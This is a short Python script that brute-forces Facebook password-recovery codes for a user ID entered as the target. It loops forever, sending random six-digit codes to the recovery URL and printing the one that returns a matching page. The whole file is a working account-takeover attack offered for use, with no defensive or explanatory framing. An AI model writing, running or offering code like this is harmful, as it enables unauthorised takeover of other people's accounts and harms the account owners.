import random,requests
user ="1234567890"
id=input("[+] Target ID : ")
while True:
 cod = str("".join(random.choice(user)for i in range(6)))
 url=f"https://www.facebook.com/recover/password/?u={id}&n={cod}&f1=default_recover&sih=0&msgr=0"
 i=requests.get(url).text
 if '<input type="text" class=' in i:
 	print (f"[√] True Code : {cod}")
 	exit()
 else :
 	print (f"[×] Wrong Code : {cod}")